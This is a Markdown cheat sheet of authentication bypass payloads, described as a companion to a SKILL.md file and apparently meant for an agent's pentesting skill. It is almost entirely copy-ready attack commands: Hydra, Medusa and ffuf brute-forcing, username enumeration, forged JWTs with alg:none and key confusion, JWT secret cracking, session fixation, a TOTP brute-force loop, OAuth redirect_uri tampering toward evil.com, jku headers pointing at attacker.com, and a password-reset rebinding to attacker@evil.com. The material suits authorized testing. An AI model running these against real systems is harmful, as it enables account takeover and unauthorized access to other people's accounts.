# Authentication Bypass Payloads

> This file is a companion to `SKILL.md`, organizing common payloads for authentication bypass testing by attack type.
> Purpose: Quickly find request construction patterns for specific attack types, ready to copy for testing.
> All payloads are for authorized security testing only.

---

## Index

1. [Username Enumeration](#1-username-enumeration)
2. [Brute Force](#2-brute-force)
3. [JWT Attacks](#3-jwt-attacks)
4. [Session Management Attacks](#4-session-management-attacks)
5. [Cookie Security Attribute Testing](#5-cookie-security-attribute-testing)
6. [MFA Bypass](#6-mfa-bypass)
7. [OAuth Flow Attacks](#7-oauth-flow-attacks)
8. [Password Reset Attacks](#8-password-reset-attacks)

---

## 1. Username Enumeration

### Response Difference Enumeration

```bash
# Determine if a user exists based on error message differences
curl -s -d "user=admin&pass=wrong" http://target.com/login | grep -o "Incorrect password"
curl -s -d "user=nonexistent&pass=wrong" http://target.com/login | grep -o "User not found"

# Response time differences (existing users take longer for password hashing)
time curl -s -d "user=admin&pass=wrong" http://target.com/login
time curl -s -d "user=nonexistent&pass=wrong" http://target.com/login
```

### ffuf Batch Enumeration

```bash
# POST form enumeration
ffuf -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
     -d "user=FUZZ&pass=test123" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -u http://target.com/login -fr "User not found"

# JSON API enumeration
ffuf -w /usr/share/seclists/Usernames/names.txt \
     -H "Content-Type: application/json" \
     -d '{"username":"FUZZ","password":"test"}' \
     -u http://target.com/api/v1/auth/login -fr "user not found"
```

### Registration/Recovery Page Enumeration

```bash
# Registration page
curl -s -X POST http://target.com/register \
     -H "Content-Type: application/json" \
     -d '{"username":"admin","email":"admin@test.com"}'
# "Username already taken" -> username exists

# Password recovery page
curl -s -X POST http://target.com/reset-password \
     -d '{"email":"admin@target.com"}'
# Different responses indicate whether the account exists
```

---

## 2. Brute Force

### Hydra -- HTTP POST

```bash
# Basic brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
      target.com http-post-form \
      "/login:username=^USER^&password=^PASS^:F=Invalid credentials"

# Multi-threaded + specified port
hydra -L users.txt -P passwords.txt -t 10 -s 8080 \
      target.com http-post-form \
      "/auth/login:user=^USER^&pass=^PASS^:S=302"
```

### Medusa -- Parallel Multi-Protocol

```bash
# HTTP form
medusa -h target.com -U users.txt -P passwords.txt \
       -M http -m FORM:/login -m FORM-DATA:"POST:user=?&password=?"

# SSH
medusa -h target.com -U users.txt -P passwords.txt -M ssh
```

### ffuf -- API Brute Force

```bash
ffuf -w passwords.txt:FUZZ \
     -H "Content-Type: application/json" \
     -d '{"username":"admin","password":"FUZZ"}' \
     -u http://target.com/api/v1/auth/login -fc 401 -mc 200
```

---

## 3. JWT Attacks

> **Prerequisite**: jwt_tool requires manual installation (not included in Kali):
> `git clone https://github.com/ticarpi/jwt_tool.git && cd jwt_tool && pip3 install pycryptodomex termcolor cprint`

### alg:none Signature Bypass

```bash
# jwt_tool one-click attack
python3 jwt_tool.py <TOKEN> -X a

# Manual construction
header=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
payload=$(echo -n '{"sub":"admin","role":"admin","iat":1700000000}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
echo "${header}.${payload}."
# Signature part is empty

# Variants: "None" / "NONE" / "nOnE"
```

### RS256 -> HS256 Algorithm Confusion

```bash
python3 jwt_tool.py <TOKEN> -X k -pk public_key.pem

# Obtain public key from JWKS URI
curl -s https://target.com/.well-known/jwks.json | jq '.keys[0]' > jwks.json
python3 jwt_tool.py <TOKEN> -X k -jw jwks.json
```

### Payload Tampering

```bash
# Modify sub field
python3 jwt_tool.py <TOKEN> -I -pc sub -pv admin
# Modify role field
python3 jwt_tool.py <TOKEN> -I -pc role -pv admin
# Add new field
python3 jwt_tool.py <TOKEN> -I -pc is_admin -pv true
# Re-sign with known key
python3 jwt_tool.py <TOKEN> -I -pc sub -pv admin -S hs256 -p "secret_key"
```

### jku / x5u Header Injection

```bash
python3 jwt_tool.py <TOKEN> -X j -ju "https://attacker.com/jwks.json"
python3 jwt_tool.py <TOKEN> -X x -xu "https://attacker.com/cert.pem"
```

### JWT Key Brute Force

```bash
# Hashcat mode 16500 (HS256)
echo "<JWT_TOKEN>" > jwt_hash.txt
hashcat -m 16500 jwt_hash.txt /usr/share/wordlists/rockyou.txt

# jwt_tool built-in dictionary
python3 jwt_tool.py <TOKEN> -C -d /usr/share/wordlists/jwt-secrets.txt
```

---

## 4. Session Management Attacks

### Session ID Predictability Analysis

```bash
for i in $(seq 1 20); do
    curl -s -c - -d "user=test&pass=test" http://target.com/login 2>/dev/null | grep session
done
# Analysis: sequential? timestamp? base64(user:timestamp)? reversible?
```

### Session Fixation Attack

```bash
# Step 1: Obtain Session ID (without logging in)
curl -s -c cookies.txt http://target.com/login
FIXED_SESSION=$(grep session cookies.txt | awk '{print $NF}')

# Step 2: Induce victim to log in with this Session ID
curl -s -b "session=$FIXED_SESSION" http://target.com/login \
     -d "user=victim&pass=victimpass"

# Step 3: Attacker uses the same Session ID to access
curl -s -b "session=$FIXED_SESSION" http://target.com/admin/profile
```

### Session Concurrency Testing

```bash
# Multiple logins from same account -- check if old session is invalidated
curl -s -c session1.txt -d "user=test&pass=test" http://target.com/login
curl -s -c session2.txt -d "user=test&pass=test" http://target.com/login
curl -s -b session1.txt http://target.com/dashboard -o /dev/null -w "%{http_code}"
# 200 -> old session still valid
```

---

## 5. Cookie Security Attribute Testing

```bash
# Comprehensive Set-Cookie Header check
curl -sI http://target.com/login | while read line; do
    if echo "$line" | grep -qi "set-cookie"; then
        echo "$line"
        echo "$line" | grep -qi "httponly" || echo "  [!] Missing HttpOnly"
        echo "$line" | grep -qi "secure" || echo "  [!] Missing Secure"
        echo "$line" | grep -qi "samesite" || echo "  [!] Missing SameSite"
    fi
done
```

---

## 6. MFA Bypass

### Direct Access Bypass

```bash
curl -s -c cookies.txt -d "user=admin&pass=admin123" http://target.com/login
# Skip /mfa/verify and access directly
curl -s -b cookies.txt http://target.com/admin/dashboard -o /dev/null -w "%{http_code}"
# 200 -> MFA not enforced
```

### TOTP Brute Force

```bash
# 6-digit code, 30-second validity, enumerate when no rate limit
for code in $(seq 000000 999999); do
    resp=$(curl -s -d "code=$code" http://target.com/verify-mfa \
           -H "Cookie: session=$SESSION")
    echo "$resp" | grep -q "success" && echo "[+] Code: $code" && break
done
```

### Reset Flow Bypass

```bash
# MFA may be temporarily disabled after password reset
curl -s -X POST http://target.com/reset-password -d '{"email":"admin@target.com"}'
# Get reset link -> reset password -> log in directly -> check MFA status
```

---

## 7. OAuth Flow Attacks

### Redirect URI Validation Bypass

```bash
# Original callback
curl "https://target.com/auth/callback?code=XXX&redirect_uri=https://target.com/dashboard"

# Tamper redirect_uri
curl "https://target.com/auth/callback?code=XXX&redirect_uri=https://evil.com/steal"
curl "https://target.com/auth/callback?code=XXX&redirect_uri=https://target.com.evil.com"
curl "https://target.com/auth/callback?code=XXX&redirect_uri=https://target.com/@evil.com"
```

### state Parameter CSRF

```bash
# Missing state parameter -> CSRF attack can bind attacker's OAuth to victim's account
# Construct malicious link: /auth/callback?code=STOLEN_CODE&state=
```

---

## 8. Password Reset Attacks

### Token Predictability

```bash
# Request multiple tokens and analyze patterns
for i in $(seq 1 5); do
    curl -s -X POST http://target.com/reset-password -d '{"email":"test@test.com"}'
    sleep 1
done
# Check: base64 timestamp? sequential number? UUID v1? short numeric (brute-forceable)?
```

### Token Reuse Testing

```bash
# Step 1: Obtain token
curl -s -X POST http://target.com/reset-password -d '{"email":"test@test.com"}'

# Step 2: Use token to reset
curl -s -X POST http://target.com/reset-password/confirm \
     -d '{"token":"TOKEN_A","password":"NewPass123!"}'

# Step 3: Reuse the same token
curl -s -X POST http://target.com/reset-password/confirm \
     -d '{"token":"TOKEN_A","password":"AnotherPass456!"}'
# Success -> token not invalidated
```

### Account Binding Bypass

```bash
# Modify the email in the reset request
curl -s -X POST http://target.com/reset-password/confirm \
     -d '{"token":"TOKEN_A","email":"attacker@evil.com","password":"NewPass!"}'
# Password changed on a different account -> binding bypass
```
